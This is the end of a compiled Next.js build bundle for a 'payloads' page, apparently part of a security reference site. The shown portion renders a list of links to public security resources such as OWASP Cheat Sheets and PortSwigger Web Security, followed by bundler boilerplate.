                                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("div", {
                                        className: "space-y-1.5",
                                        children: [
                                            {
                                                label: 'PayloadsAllTheThings',
                                                href: 'https://github.com/swisskyrepo/PayloadsAllTheThings'
                                            },
                                            {
                                                label: 'HackTricks',
                                                href: 'https://book.hacktricks.xyz'
                                            },
                                            {
                                                label: 'PortSwigger Web Sec',
                                                href: 'https://portswigger.net/web-security'
                                            },
                                            {
                                                label: 'OWASP Cheat Sheets',
                                                href: 'https://cheatsheetseries.owasp.org'
                                            }
                                        ].map((r)=>/*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$project$5d2f$node_modules$2f$next$2f$dist$2f$server$2f$route$2d$modules$2f$app$2d$page$2f$vendored$2f$ssr$2f$react$2d$jsx$2d$dev$2d$runtime$2e$js__$5b$app$2d$ssr$5d$__$28$ecmascript$29$__["jsxDEV"])("a", {
                                                href: r.href,
                                                target: "_blank",
                                                rel: "noreferrer",
                                                className: "block font-mono text-[10px] text-slate-500 hover:text-accent2 transition-colors py-1 border-b border-white/[0.03] truncate",
                                                children: [
                                                    "↗ ",
                                                    r.label
                                                ]
                                            }, r.label, true, {
                                                fileName: "[project]/src/app/payloads/page.tsx",
                                                lineNumber: 197,
                                                columnNumber: 17
                                            }, this))
                                    }, void 0, false, {
                                        fileName: "[project]/src/app/payloads/page.tsx",
                                        lineNumber: 190,
                                        columnNumber: 13
                                    }, this)
                                ]
                            }, void 0, true, {
                                fileName: "[project]/src/app/payloads/page.tsx",
                                lineNumber: 188,
                                columnNumber: 11
                            }, this)
                        ]
                    }, void 0, true, {
                        fileName: "[project]/src/app/payloads/page.tsx",
                        lineNumber: 162,
                        columnNumber: 9
                    }, this)
                ]
            }, void 0, true, {
                fileName: "[project]/src/app/payloads/page.tsx",
                lineNumber: 112,
                columnNumber: 7
            }, this)
        ]
    }, void 0, true, {
        fileName: "[project]/src/app/payloads/page.tsx",
        lineNumber: 91,
        columnNumber: 5
    }, this);
}
}}),
"[project]/src/app/payloads/page.tsx [app-rsc] (ecmascript, Next.js server component, client modules ssr)": ((__turbopack_context__) => {

var { r: __turbopack_require__, f: __turbopack_module_context__, i: __turbopack_import__, s: __turbopack_esm__, v: __turbopack_export_value__, n: __turbopack_export_namespace__, c: __turbopack_cache__, M: __turbopack_modules__, l: __turbopack_load__, j: __turbopack_dynamic__, P: __turbopack_resolve_absolute_path__, U: __turbopack_relative_url__, R: __turbopack_resolve_module_id_path__, b: __turbopack_worker_blob_url__, g: global, __dirname, t: __turbopack_require_real__ } = __turbopack_context__;
{
}}),

};

//# sourceMappingURL=src_app_payloads_page_tsx_568776._.js.map